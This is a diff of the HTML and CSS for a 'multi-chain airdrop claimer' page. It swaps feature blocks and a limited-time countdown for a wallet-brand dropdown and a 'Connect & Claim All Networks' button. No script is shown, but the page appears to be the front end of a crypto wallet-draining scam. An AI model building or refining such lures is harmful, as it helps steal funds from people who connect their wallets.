@@ -311,6 +311,81 @@
             cursor: not-allowed;
         }
 
+        /* Simple Wallet Selector */
+        .wallet-selector-container {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .wallet-selector-title {
+            color: #4ecdc4;
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .wallet-selector-dropdown {
+            width: 100%;
+            max-width: 400px;
+            padding: 15px 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 0 auto 20px;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='white' viewBox='0 0 16 16'%3e%3cpath d='m7.247 4.86-4.796 5.481c-.566.647-.106 1.659.753 1.659h9.592a1 1 0 0 0 .753-1.659l-4.796-5.48a1 1 0 0 0-1.506 0z'/%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            background-size: 12px;
+            padding-right: 45px;
+        }
+
+        .wallet-selector-dropdown:focus {
+            outline: none;
+            border-color: #4ecdc4;
+            box-shadow: 0 0 0 3px rgba(78, 205, 196, 0.3);
+        }
+
+        .wallet-selector-dropdown option {
+            background: #2c3e50;
+            color: white;
+            padding: 15px;
+            font-size: 1rem;
+        }
+
+        .wallet-connect-btn {
+            background: linear-gradient(45deg, #4CAF50, #45a049);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            min-width: 200px;
+        }
+
+        .wallet-connect-btn:hover:not(:disabled) {
+            background: linear-gradient(45deg, #45a049, #3d8b40);
+            transform: translateY(-2px);
+        }
+
+        .wallet-connect-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
         .network-stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
@@ -544,54 +619,27 @@
         <h1 class="logo">CryptoMax Multi-Network</h1>
         <p class="subtitle">🌐 The Ultimate Multi-Chain Airdrop Claimer</p>
 
-        <div class="features">
-            <div class="feature">
-                <span class="feature-icon">🔗</span>
-                <h3>Multi-Chain Support</h3>
-                <p>Ethereum, BSC, Polygon, Solana, Tron, Avalanche & more</p>
-            </div>
-            <div class="feature">
-                <span class="feature-icon">⚡</span>
-                <h3>Batch Processing</h3>
-                <p>Process all networks simultaneously for maximum efficiency</p>
-            </div>
-            <div class="feature">
-                <span class="feature-icon">💎</span>
-                <h3>Universal Tokens</h3>
-                <p>Claim native coins + popular tokens on each network</p>
-            </div>
-            <div class="feature">
-                <span class="feature-icon">🛡️</span>
-                <h3>Auto-Detection</h3>
-                <p>Smart wallet detection across all supported networks</p>
-            </div>
-        </div>
 
-        <div class="countdown">
-            ⏰ Limited Time Multi-Chain Airdrop Event - Connect All Your Networks Now!
-        </div>
-
-        <div class="global-stats">
-            <div class="global-stat">
-                <div class="global-stat-value" id="total-networks">0</div>
-                <div class="global-stat-label">Networks Connected</div>
-            </div>
-            <div class="global-stat">
-                <div class="global-stat-value" id="total-wallets">0</div>
-                <div class="global-stat-label">Total Wallets</div>
-            </div>
-            <div class="global-stat">
-                <div class="global-stat-value" id="total-value">$0.00</div>
-                <div class="global-stat-label">Total Portfolio Value</div>
-            </div>
-        </div>
-
-        <div class="network-tabs" id="network-tabs">
-            <!-- Network tabs will be populated by JavaScript -->
-        </div>
-
-        <div id="network-contents">
-            <!-- Network content will be populated by JavaScript -->
+        <div class="wallet-selector-container">
+            <div class="wallet-selector-title">🎯 Select Your Wallet</div>
+            <select class="wallet-selector-dropdown" id="wallet-selector">
+                <option value="">Choose your wallet type...</option>
+                <option value="metamask">🦊 MetaMask</option>
+                <option value="trust">🛡️ Trust Wallet</option>
+                <option value="coinbase">🔵 Coinbase Wallet</option>
+                <option value="rainbow">🌈 Rainbow</option>
+                <option value="phantom">👻 Phantom</option>
+                <option value="solflare">☀️ Solflare</option>
+                <option value="backpack">🎒 Backpack</option>
+                <option value="glow">✨ Glow</option>
+                <option value="tronlink">� TronLink</option>
+                <option value="injected-evm">� Mobile EVM Wallet</option>
+                <option value="injected-solana">� Mobile Solana Wallet</option>
+                <option value="injected-tron">📱 Mobile Tron Wallet</option>
+            </select>
+            <button class="wallet-connect-btn" id="connect-wallet-btn" disabled>
+                🔗 Connect & Claim All Networks
+            </button>
         </div>
 
         <div class="button-container">
